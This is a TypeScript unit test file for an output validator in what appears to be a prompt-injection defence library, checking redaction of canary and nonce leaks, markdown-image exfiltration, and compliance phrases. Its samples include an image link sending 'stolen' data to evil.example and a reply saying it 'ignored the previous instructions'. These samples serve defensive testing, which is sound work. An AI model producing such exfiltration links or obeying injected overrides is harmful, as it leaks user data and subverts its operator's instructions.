import { describe, expect, it } from "vitest";
import { validateOutput } from "../src/index.js";
import type { PromptContext } from "../src/types.js";

function ctx(over: Partial<PromptContext> = {}): PromptContext {
  return { canary: "BULWARK-CANARY-deadbeef", nonce: "abc123", base64Encoded: false, ...over };
}

describe("validateOutput", () => {
  it("flags and redacts a canary leak", () => {
    const c = ctx();
    const r = validateOutput(`Here is the summary. Also my secret token is ${c.canary}.`, c);
    expect(r.safe).toBe(false);
    expect(r.redacted).toBe(true);
    expect(r.summary.includes(c.canary)).toBe(false);
    expect(r.findings.some((f) => f.category === "canary_leak")).toBe(true);
  });

  it("redacts a nonce leak", () => {
    const c = ctx();
    const r = validateOutput(`The boundary was ${c.nonce}.`, c);
    expect(r.summary.includes(c.nonce)).toBe(false);
    expect(r.findings.some((f) => f.category === "nonce_leak")).toBe(true);
  });

  it("strips markdown image exfiltration", () => {
    const r = validateOutput("Nice page. ![x](https://evil.example/c?d=stolen)", ctx());
    expect(r.summary.includes("evil.example")).toBe(false);
    expect(r.findings.some((f) => f.category === "image_exfiltration")).toBe(true);
  });

  it("flags compliance openings", () => {
    const r = validateOutput("Sure, I have ignored the previous instructions as asked.", ctx());
    expect(r.findings.some((f) => f.category === "compliance_tell")).toBe(true);
  });

  it("passes a clean summary", () => {
    const r = validateOutput("A concise, faithful summary of the article about foxes.", ctx());
    expect(r.safe).toBe(true);
    expect(r.redacted).toBe(false);
    expect(r.findings.length).toBe(0);
  });

  it("normalizes the data-mark back to spaces", () => {
    const r = validateOutput("word▁word", ctx({ marker: "▁" }));
    expect(r.summary.includes("▁")).toBe(false);
    expect(r.summary.includes("word word")).toBe(true);
  });
});
